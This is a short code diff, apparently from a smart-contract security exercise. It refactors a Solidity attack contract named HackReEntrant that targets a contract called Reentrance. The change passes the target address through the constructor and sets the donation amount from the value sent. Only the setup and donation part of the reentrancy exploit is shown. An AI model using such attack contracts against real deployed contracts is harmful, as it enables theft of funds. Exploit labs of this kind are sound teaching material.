@@ -30,16 +30,18 @@ contract Reentrance {
   	receive() external payable {}
 }
 
-contract HackReEntrant2 {
-    Reentrance public original = Reentrance(0x0000); /// @dev put instance address here
-    uint public amount = 1000000000000000 wei;
+contract HackReEntrant {
+    Reentrance public original;
+    uint public amount;
 	address payable actor;
 
-    constructor() public {
+    constructor(Reentrance _address) public {
 		actor = msg.sender;
+		original = _address;
     }
 
     function donateToSelf() public payable { 
+		amount = msg.value;
         original.donate.value(amount).gas(1000000000000000)(address(this));
     }
 
